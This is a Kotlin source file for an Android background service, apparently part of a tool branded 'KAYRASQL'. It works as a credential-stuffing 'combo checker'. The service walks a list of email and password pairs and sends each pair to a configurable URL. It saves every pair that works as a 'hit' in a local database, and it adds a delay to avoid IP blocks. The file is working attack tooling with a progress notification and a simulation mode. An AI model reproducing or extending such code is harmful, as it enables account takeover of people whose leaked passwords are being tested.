package com.example.service

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.AudioManager
import android.media.RingtoneManager
import android.media.ToneGenerator
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.example.data.AppDatabase
import com.example.data.CheckerState
import com.example.data.Hit
import com.example.data.HitRepository
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

class CheckerService : Service() {

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    
    private lateinit var hitRepository: HitRepository
    private val okHttpClient = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    private val channelId = "KAYRASQL_CHECKER_CHANNEL"
    private val notificationId = 1919

    private val stopReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == "com.example.ACTION_STOP_CHECKER") {
                CheckerState.stop()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        val hitDao = AppDatabase.getDatabase(this).hitDao()
        hitRepository = HitRepository(hitDao)
        
        // Register stop action broadcast receiver
        val filter = IntentFilter("com.example.ACTION_STOP_CHECKER")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(stopReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(stopReceiver, filter)
            }
        } else {
            registerReceiver(stopReceiver, filter)
        }

        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Start foreground immediately
        val notification = buildProgressNotification(0, 0, 0, "Checking initialized...")
        startForeground(notificationId, notification)

        // Launch checker loop
        CheckerState.isChecking.value = true
        serviceScope.launch {
            runCheckerLoop()
        }

        return START_NOT_STICKY
    }

    private suspend fun runCheckerLoop() {
        val list = CheckerState.combosList
        var currentIndex = CheckerState.checkedCount.value
        
        while (CheckerState.isChecking.value && currentIndex < list.size) {
            val (email, password) = list[currentIndex]
            
            // Set current checking accounts
            CheckerState.currentEmail.value = email
            CheckerState.currentPassword.value = password

            var isValid = false
            var responseStr = ""

            if (CheckerState.simulationMode.value) {
                // Simulation checking
                delay(850)
                // Let's make specific ones or random ones valid for demonstration
                isValid = email.contains("ArianaGrande190", ignoreCase = true) || 
                          email.startsWith("valid", ignoreCase = true) ||
                          (currentIndex % 7 == 0)
                responseStr = if (isValid) {
                    """{"success":true,"status":"valid","message":"Giriş başarılı [Simulated]","code":200,"email":"$email","password":"$password"}"""
                } else {
                    """{"success":false,"status":"invalid","message":"Geçersiz email veya şifre [Simulated]","code":401,"email":"$email","password":"$password"}"""
                }
            } else {
                // Live internet checking
                val baseUrl = CheckerState.currentCustomUrl.value
                val fullUrl = if (baseUrl.contains("?")) {
                    "$baseUrl&email=${android.net.Uri.encode(email)}&password=${android.net.Uri.encode(password)}"
                } else {
                    "$baseUrl?email=${android.net.Uri.encode(email)}&password=${android.net.Uri.encode(password)}"
                }

                val request = Request.Builder()
                    .url(fullUrl)
                    .header("User-Agent", "KayraSQL System Professional Android client v2.4")
                    .build()

                try {
                    val response = okHttpClient.newCall(request).execute()
                    val body = response.body?.string() ?: ""
                    responseStr = body
                    
                    if (response.isSuccessful && body.isNotEmpty()) {
                        val json = JSONObject(body)
                        isValid = json.optBoolean("success", false) || 
                                  json.optString("status").equals("valid", ignoreCase = true)
                    } else {
                        isValid = false
                    }
                } catch (e: Exception) {
                    isValid = false
                    responseStr = "Hata: ${e.message}"
                }
                
                // standard delay between live checks to be polite to APIs and avoid quick ip blocks
                delay(1200)
            }

            // Record and increment stats safely
            currentIndex++
            CheckerState.checkedCount.value = currentIndex
            
            if (isValid) {
                CheckerState.successCount.value++
                val hit = Hit(email = email, password = password, apiResponse = responseStr)
                hitRepository.insert(hit)
            } else {
                CheckerState.failureCount.value++
            }

            // Update Notification progress bar
            val total = list.size
            val remaining = total - currentIndex
            val progressPercent = if (total > 0) (currentIndex * 100 / total) else 0
            val success = CheckerState.successCount.value
            val contextStatusText = "Kalan: $remaining | Başarılı: $success"
            
            updateNotification(progressPercent, total, currentIndex, contextStatusText)
        }

        // Processing finished or stopped
        val wasFinished = (currentIndex >= list.size && list.isNotEmpty())
        CheckerState.isChecking.value = false
        
        if (wasFinished && CheckerState.soundEnabled.value) {
            playAlertSound()
        }

        stopForeground(true)
        stopSelf()
    }

    private fun playAlertSound() {
        try {
            // Beep tone 1
            val toneG = ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100)
            toneG.startTone(ToneGenerator.TONE_PROP_BEEP, 300)
            
            // Beep tone 2
            serviceScope.launch {
                delay(500)
                try {
                    toneG.startTone(ToneGenerator.TONE_PROP_BEEP2, 400)
                } catch (e: Exception) {
                    // Ignored
                }
            }

            // Play standard notification ringtone
            val notificationUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
                    ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            val ringtone = RingtoneManager.getRingtone(applicationContext, notificationUri)
            if (ringtone != null) {
                ringtone.play()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                channelId,
                "KAYRASQL Checker Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background task execution validation channel"
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    private fun buildProgressNotification(
        progress: Int,
        total: Int,
        current: Int,
        statusText: String
    ): Notification {
        val stopIntent = Intent("com.example.ACTION_STOP_CHECKER").apply {
            `package` = packageName
        }
        val stopPendingIntent = PendingIntent.getBroadcast(
            this,
            0,
            stopIntent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT else PendingIntent.FLAG_UPDATE_CURRENT
        )

        val mainActivityIntent = Intent(this, com.example.MainActivity::class.java)
        val mainPendingIntent = PendingIntent.getActivity(
            this,
            1,
            mainActivityIntent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT else PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("KAYRASQL SYSTEM: Çalışıyor")
            .setContentText(statusText)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setProgress(100, progress, false)
            .setContentIntent(mainPendingIntent)
            .addAction(
                android.R.drawable.ic_media_pause,
                "DURDUR",
                stopPendingIntent
            )
            .setOngoing(true)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }

    private fun updateNotification(
        progress: Int,
        total: Int,
        current: Int,
        statusText: String
    ) {
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val notification = buildProgressNotification(progress, total, current, statusText)
        manager.notify(notificationId, notification)
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        try {
            unregisterReceiver(stopReceiver)
        } catch (e: Exception) {
            // Ignored
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
